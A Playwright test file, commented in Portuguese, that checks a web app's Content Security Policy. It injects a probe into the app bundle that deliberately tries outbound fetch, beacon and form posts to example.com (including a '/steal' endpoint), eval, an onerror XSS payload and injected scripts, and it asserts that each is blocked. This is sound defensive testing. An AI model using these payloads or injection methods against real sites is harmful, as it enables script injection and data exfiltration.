// CSP — navegador (W0-03 §7): abre cada rota no preview COM os cabeçalhos e exige zero violação e zero erro no console.
// Depois tenta de propósito o que a política tem de barrar: fetch para fora, eval, innerHTML, script injetado, form, iframe.
//
// ATENÇÃO: `page.evaluate` roda via CDP e IGNORA a CSP para eval (allowUnsafeEvalBlockedByCSP). Por isso as tentativas
// abaixo NÃO rodam em page.evaluate: elas entram no bundle do app (page.route acrescenta o código a um .js servido com
// os cabeçalhos reais) e rodam como código da página, sob a CSP de verdade. O evaluate só chama `window.__t.*`.
import { readFileSync } from "node:fs";
import { expect, test, type Page } from "@playwright/test";
import { previewHeaders } from "../../config/headers.ts";

/** Acrescente aqui toda rota nova (W1-08 em diante). */
const ROUTES = ["/", "/welcome", "/place/bakery", "/profile", "/settings", "/about", "/rota-que-nao-existe"];

const fileHeaders = previewHeaders(readFileSync("public/_headers", "utf8"));

type Violation = { violated: string; blocked: string };
type Probe = Record<string, () => unknown>;
declare global {
  interface Window {
    __csp: Violation[];
    __t: Probe;
    __early: { eval: string; newFunction: string };
  }
}

/** Código que roda DENTRO da página (sob a CSP). Cada função devolve o resultado como dado simples. */
const PROBE = String.raw`
;(() => {
  const attempt = (f) => { try { f(); return "passou"; } catch (e) { return e.name; } };
  // eval e new Function rodam AGORA, no carregamento do bundle: dentro de uma chamada de page.evaluate a CDP desliga a trava de eval.
  window.__early = {
    eval: (() => { try { return "rodou:" + String(eval("1+1")); } catch (e) { return e.name; } })(),
    newFunction: (() => { try { return "rodou:" + String(new Function("return 1")()); } catch (e) { return e.name; } })(),
  };
  window.__t = {
    fetchExterno: () => fetch("https://example.com/").then(() => "enviou", () => "bloqueado"),
    xhrExterno: () => new Promise((resolve) => {
      const x = new XMLHttpRequest();
      x.open("GET", "https://example.com/");
      x.onerror = () => resolve("bloqueado");
      x.onload = () => resolve("enviou");
      x.send();
    }),
    beaconExterno: () => { navigator.sendBeacon("https://example.com/", "k"); return "tentou"; },
    html: () => {
      const el = document.createElement("div");
      document.body.append(el);
      return [
        attempt(() => { el.innerHTML = "<img src=x onerror=alert(1)>"; }),
        attempt(() => { el.outerHTML = "<b>x</b>"; }),
        attempt(() => el.insertAdjacentHTML("beforeend", "<i>x</i>")),
        attempt(() => document.write("<b>x</b>")),
        attempt(() => { if (el.setHTMLUnsafe) el.setHTMLUnsafe("<b>x</b>"); else throw new TypeError("ausente"); }),
      ];
    },
    politicas: () => ["default", "evil", "glifora-sw-2"].map((n) => {
      try { window.trustedTypes.createPolicy(n, { createHTML: (s) => s }); return "criou"; } catch { return "bloqueado"; }
    }),
    scriptInline: () => {
      const s = document.createElement("script");
      const r = attempt(() => { s.textContent = "window.__pwned = true"; });
      document.head.append(s);
      return r;
    },
    scriptExterno: () => {
      const s = document.createElement("script");
      const r = attempt(() => { s.src = "https://example.com/x.js"; });
      document.head.append(s);
      return r;
    },
    formExterno: () => {
      const f = document.createElement("form");
      f.action = "https://example.com/steal";
      f.method = "post";
      document.body.append(f);
      f.requestSubmit();
      return "enviado";
    },
    recursosExternos: () => {
      const f = document.createElement("iframe"); f.src = "https://example.com/"; document.body.append(f);
      const i = new Image(); i.src = "https://example.com/pixel.png";
      const l = document.createElement("link"); l.rel = "stylesheet"; l.href = "https://example.com/x.css"; document.head.append(l);
      return "tentou";
    },
  };
})();
`;

/** Registra cada securitypolicyviolation (antes de qualquer script da página). */
async function watchViolations(page: Page): Promise<void> {
  await page.addInitScript(() => {
    window.__csp = [];
    document.addEventListener("securitypolicyviolation", (e) => {
      window.__csp.push({ violated: e.violatedDirective, blocked: e.blockedURI });
    });
  });
}

/** Acrescenta o PROBE ao JS do app, mantendo os cabeçalhos (e a CSP) da resposta original. */
async function openWithProbe(page: Page): Promise<void> {
  await watchViolations(page);
  await page.route("**/assets/*.js", async (route) => {
    try {
      const response = await route.fetch();
      await route.fulfill({ response, body: `${await response.text()}\n${PROBE}` });
    } catch {
      // o teste terminou com um chunk ainda a caminho (carga preguiçosa de rota): resposta descartada, sem importância
    }
  });
  await page.goto("/");
  await page.locator("#root *").first().waitFor();
  expect(await page.evaluate(() => typeof window.__t), "probe não carregou").toBe("object");
}

const call = <T>(page: Page, name: string): Promise<T> => page.evaluate((n) => window.__t[n]!() as T, name);
const violations = async (page: Page): Promise<string[]> => (await page.evaluate(() => window.__csp)).map((v) => v.violated);

test.describe("CSP — rotas limpas", () => {
  for (const route of ROUTES) {
    test(`${route}: cabeçalhos iguais ao arquivo, zero violação, console limpo, só rede do próprio site`, async ({ page, baseURL }) => {
      await watchViolations(page);
      const problems: string[] = [];
      const foreign: string[] = [];
      page.on("console", (m) => {
        if (m.type() === "error" || m.type() === "warning") problems.push(`console.${m.type()}: ${m.text()} ${m.location().url}`);
      });
      page.on("pageerror", (e) => problems.push(`pageerror: ${e.message}`));
      page.on("response", (r) => {
        if (r.status() >= 400) problems.push(`HTTP ${r.status()}: ${r.url()}`);
      });
      page.on("request", (r) => {
        if (!r.url().startsWith(baseURL ?? "")) foreign.push(r.url());
      });

      const response = await page.goto(route);
      expect(response?.status()).toBe(200);
      const headers = response?.headers() ?? {};
      for (const [name, value] of Object.entries(fileHeaders)) expect(headers[name.toLowerCase()], name).toBe(value);

      await page.locator("#root *").first().waitFor(); // o React montou
      await page.waitForLoadState("networkidle");

      expect(await page.evaluate(() => window.__csp)).toEqual([]);
      expect(problems).toEqual([]);
      expect(foreign).toEqual([]);
    });
  }
});

test.describe("CSP — tentativas de propósito (têm de falhar)", () => {
  test.beforeEach(async ({ page }) => {
    await openWithProbe(page);
  });

  test("fetch e XMLHttpRequest para fora são bloqueados por connect-src", async ({ page }) => {
    expect(await call(page, "fetchExterno")).toBe("bloqueado");
    expect(await call(page, "xhrExterno")).toBe("bloqueado");
    expect(await violations(page)).toContain("connect-src");
  });

  test("sendBeacon para fora é bloqueado por connect-src", async ({ page, baseURL }) => {
    const external: string[] = [];
    page.on("request", (r) => {
      if (!r.url().startsWith(baseURL ?? "")) external.push(r.url());
    });
    await call(page, "beaconExterno");
    await page.waitForTimeout(500);
    expect(await violations(page)).toContain("connect-src");
  });

  test("eval e new Function são bloqueados por script-src", async ({ page }) => {
    expect(await page.evaluate(() => window.__early)).toEqual({ eval: "EvalError", newFunction: "EvalError" });
    // Com Trusted Types, eval de string falha primeiro em require-trusted-types-for; sem ele, seria script-src.
    expect((await violations(page)).some((v) => v === "script-src" || v === "require-trusted-types-for")).toBe(true);
  });

  test("innerHTML, outerHTML, insertAdjacentHTML, document.write e setHTMLUnsafe lançam (Trusted Types)", async ({ page }) => {
    const result = await call<string[]>(page, "html");
    expect(result, JSON.stringify(result)).toEqual(Array(5).fill("TypeError"));
  });

  test("não dá para criar política de Trusted Types fora da lista (nem a 'default')", async ({ page }) => {
    expect(await call(page, "politicas")).toEqual(["bloqueado", "bloqueado", "bloqueado"]);
  });

  test("script injetado, inline e externo, não executa", async ({ page }) => {
    expect(await call(page, "scriptInline")).toBe("TypeError");
    expect(await call(page, "scriptExterno")).toBe("TypeError");
    await page.waitForTimeout(500);
    expect(await page.evaluate(() => (window as unknown as Record<string, unknown>)["__pwned"])).toBeUndefined();
  });

  test("form para fora é bloqueado por form-action e nada sai", async ({ page, baseURL }) => {
    const external: string[] = [];
    page.on("request", (r) => {
      if (!r.url().startsWith(baseURL ?? "")) external.push(r.url());
    });
    await call(page, "formExterno");
    await page.waitForTimeout(500);
    expect(await violations(page)).toContain("form-action");
    expect(external).toEqual([]);
  });

  test("iframe, imagem e CSS de fora são bloqueados", async ({ page }) => {
    await call(page, "recursosExternos");
    await page.waitForTimeout(800);
    expect(await violations(page)).toEqual(expect.arrayContaining(["frame-src", "img-src", "style-src-elem"]));
  });
});

test("a página não pode ser embutida (X-Frame-Options e frame-ancestors)", async ({ page, baseURL }) => {
  const res = await page.request.get(baseURL ?? "/");
  expect(res.headers()["x-frame-options"]).toBe("DENY");
  expect(res.headers()["content-security-policy"]).toContain("frame-ancestors 'none'");
});
